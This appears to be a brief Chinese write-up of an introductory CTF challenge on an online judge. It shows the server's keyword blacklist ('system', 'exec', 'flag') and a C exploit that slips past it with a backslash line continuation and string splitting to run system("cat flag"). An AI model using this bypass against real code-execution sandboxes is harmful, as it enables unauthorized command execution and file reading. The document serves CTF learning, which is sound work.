## Easy | Kap0k OnlineJudge | Author: Q4n

就挺简单的, 不知道为啥没啥人做, 最后才有人看一眼...

先说说思路: (太多了)
  1. 字符拼接绕过/动态生成字符串打开文件读flag
  2. 写shellcode
  3. 用函数地址调用被限制的函数
  4. \ 直接绕过
  5. .........

下面说说这个题, 其实这个题是直接从某比赛(De1taCTF)中扒下来的, 他原本的意思是限制用64位下用32位shellcode来读flag, 但我怀疑他放错附件的, 导致这题直接就能system("cat flag").
这里的出题其实并没有变多少, 只是在python端加了个简单的过滤, 而且在hint中给出(毕竟是签到题). 就是个简单的字符串匹配而已

```python
            # check
            code = request.form['code']
            if 'system' in code or 'exec' in code or 'flag' in code:
                return "ERROR!"
```

随便给个exp

```c
int main(){
sys\
tem("cat f""lag");
}
```

